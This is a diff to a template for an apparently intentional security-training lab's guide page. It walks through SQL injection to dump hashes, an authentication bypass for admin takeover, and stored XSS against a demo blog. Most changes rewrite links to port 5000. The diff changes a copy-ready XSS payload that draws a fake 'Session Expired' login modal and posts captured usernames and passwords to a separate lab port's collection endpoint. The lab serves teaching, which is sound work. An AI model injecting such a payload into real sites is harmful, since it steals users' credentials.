@@ -18,7 +18,7 @@
                     onsubmit="return confirm('Reset all laboratory data back to initial seed state?');">
                     <button type="submit" class="btn btn-danger btn-sm">Reset Lab State</button>
                 </form>
-                <a href="{{ url_for('blog.index') }}" target="_blank" class="lab-nav-btn">
+                <a href="{{ blog_url('/') }}" target="_blank" class="lab-nav-btn">
                     View Target Blog
                 </a>
                 <a href="{{ url_for('lab.attacker_panel') }}" target="_blank" class="lab-nav-btn btn-attacker">
@@ -80,14 +80,14 @@
                         first dumping users and hashes via search, then bypassing authentication to take over the
                         administrator
                         account.</p>
-                    <p><strong>Target Features:</strong> Post Search (<a href="{{ url_for('blog.index') }}"
-                            target="_blank"><code>/</code></a>)
-                        and Account Login (<a href="{{ url_for('auth.login') }}"
-                            target="_blank"><code>/login</code></a>)</p>
+                    <p><strong>Target Features:</strong> Post Search (<a href="{{ blog_url('/') }}"
+                            target="_blank"><code>:5000/</code></a>)
+                        and Account Login (<a href="{{ blog_url('/login') }}"
+                            target="_blank"><code>:5000/login</code></a>)</p>
 
                     <h3>Demonstration Steps</h3>
                     <ol>
-                        <li>Toggle mode to <strong>Vulnerable Mode</strong> via the top bar switch.</li>
+                        <li>Toggle mode to <strong>Vulnerable Mode</strong> via the top bar switch on this guide.</li>
                     </ol>
 
                     <h4>Phase 1: Reconnaissance & Data Exfiltration (Search)</h4>
@@ -112,7 +112,7 @@
 
                     <h4>Phase 2: Account Takeover via Authentication Bypass (Login)</h4>
                     <p>Having identified that <code>admin</code> and <code>alice</code> exist, the attacker navigates to
-                        <a href="{{ url_for('auth.login') }}" target="_blank"><code>/login</code></a>. Using their
+                        <a href="{{ blog_url('/login') }}" target="_blank"><code>:5000/login</code></a>. Using their
                         knowledge of Alice's account
                         (password: <code>alice123</code>), they substitute Admin's password hash with Alice's hash:
                     </p>
@@ -173,8 +173,8 @@
                         to inject arbitrary HTML and JavaScript that executes in the security context of any victim
                         viewing the post.</p>
                     <p><strong>Target Feature:</strong> Post Comments (<a
-                            href="{{ url_for('blog.post_detail', post_id=1) }}#comments"
-                            target="_blank"><code>/posts/1#comments</code></a>)</p>
+                            href="{{ blog_url('/posts/1#comments') }}"
+                            target="_blank"><code>:5000/posts/1#comments</code></a>)</p>
                     <p><strong>Prerequisites:</strong> Sign in with an account (e.g., <code>alice</code> /
                         <code>alice123</code>, register a new account, or use the SQLi login bypass) to read full
                         articles and unlock the comment form.
@@ -189,7 +189,7 @@
                             Per Tab):</label>
                         <div class="copy-input-row">
                             <textarea readonly class="copy-field copy-field-multiline" id="payload-xss-phish"
-                                rows="3">&lt;div id="phish-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:99999;display:none;align-items:center;justify-content:center;backdrop-filter:blur(3px);"&gt;&lt;div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:24px;width:100%;max-width:360px;box-shadow:0 8px 24px rgba(0,0,0,0.6);font-family:-apple-system,sans-serif;color:#c9d1d9;"&gt;&lt;div style="text-align:center;margin-bottom:16px;"&gt;&lt;h3 style="margin:0 0 6px;color:#fff;font-size:17px;"&gt;Session Expired&lt;/h3&gt;&lt;p style="margin:0;font-size:12px;color:#8b949e;"&gt;Please re-authenticate to confirm your identity.&lt;/p&gt;&lt;/div&gt;&lt;form id="phish-form" style="display:flex;flex-direction:column;gap:12px;"&gt;&lt;div&gt;&lt;label style="display:block;font-size:12px;margin-bottom:4px;color:#8b949e;"&gt;Username&lt;/label&gt;&lt;input type="text" id="phish-u" required placeholder="alice" style="width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#fff;font-size:14px;box-sizing:border-box;"&gt;&lt;/div&gt;&lt;div&gt;&lt;label style="display:block;font-size:12px;margin-bottom:4px;color:#8b949e;"&gt;Password&lt;/label&gt;&lt;input type="password" id="phish-p" required placeholder="••••••••" style="width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#fff;font-size:14px;box-sizing:border-box;"&gt;&lt;/div&gt;&lt;button type="submit" style="margin-top:6px;padding:9px;background:#238636;border:1px solid #2ea043;border-radius:6px;color:#fff;font-weight:600;cursor:pointer;font-size:14px;"&gt;Sign in &amp;amp; Continue&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;(function(){var m=document.getElementById("phish-modal"),f=document.getElementById("phish-form"),b=document.querySelector(".user-badge");if(!m||!f)return;if(!b||sessionStorage.getItem("reauth_done")){m.remove();return;}var u=document.getElementById("phish-u");if(u)u.value=b.textContent.replace(/^@/,"").trim();m.style.display="flex";f.onsubmit=function(e){e.preventDefault();sessionStorage.setItem("reauth_done","1");var p=document.getElementById("phish-p");fetch("/lab/api/captured-credentials",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u?u.value:"",password:p?p.value:"",source_page:window.location.pathname})}).finally(function(){m.remove();});};})();&lt;/script&gt;</textarea>
+                                rows="3">&lt;div id="phish-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:99999;display:none;align-items:center;justify-content:center;backdrop-filter:blur(3px);"&gt;&lt;div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:24px;width:100%;max-width:360px;box-shadow:0 8px 24px rgba(0,0,0,0.6);font-family:-apple-system,sans-serif;color:#c9d1d9;"&gt;&lt;div style="text-align:center;margin-bottom:16px;"&gt;&lt;h3 style="margin:0 0 6px;color:#fff;font-size:17px;"&gt;Session Expired&lt;/h3&gt;&lt;p style="margin:0;font-size:12px;color:#8b949e;"&gt;Please re-authenticate to confirm your identity.&lt;/p&gt;&lt;/div&gt;&lt;form id="phish-form" style="display:flex;flex-direction:column;gap:12px;"&gt;&lt;div&gt;&lt;label style="display:block;font-size:12px;margin-bottom:4px;color:#8b949e;"&gt;Username&lt;/label&gt;&lt;input type="text" id="phish-u" required placeholder="alice" style="width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#fff;font-size:14px;box-sizing:border-box;"&gt;&lt;/div&gt;&lt;div&gt;&lt;label style="display:block;font-size:12px;margin-bottom:4px;color:#8b949e;"&gt;Password&lt;/label&gt;&lt;input type="password" id="phish-p" required placeholder="••••••••" style="width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#fff;font-size:14px;box-sizing:border-box;"&gt;&lt;/div&gt;&lt;button type="submit" style="margin-top:6px;padding:9px;background:#238636;border:1px solid #2ea043;border-radius:6px;color:#fff;font-weight:600;cursor:pointer;font-size:14px;"&gt;Sign in &amp;amp; Continue&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;(function(){var m=document.getElementById("phish-modal"),f=document.getElementById("phish-form"),b=document.querySelector(".user-badge");if(!m||!f)return;if(!b||sessionStorage.getItem("reauth_done")){m.remove();return;}var u=document.getElementById("phish-u");if(u)u.value=b.textContent.replace(/^@/,"").trim();m.style.display="flex";f.onsubmit=function(e){e.preventDefault();sessionStorage.setItem("reauth_done","1");var p=document.getElementById("phish-p");fetch(window.location.protocol+"//"+window.location.hostname+":{{ config.LAB_PORT }}/lab/api/captured-credentials",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u?u.value:"",password:p?p.value:"",source_page:window.location.href})}).finally(function(){m.remove();});};})();&lt;/script&gt;</textarea>
                             <button type="button" class="btn btn-secondary btn-copy"
                                 data-target="payload-xss-phish">Copy</button>
                         </div>
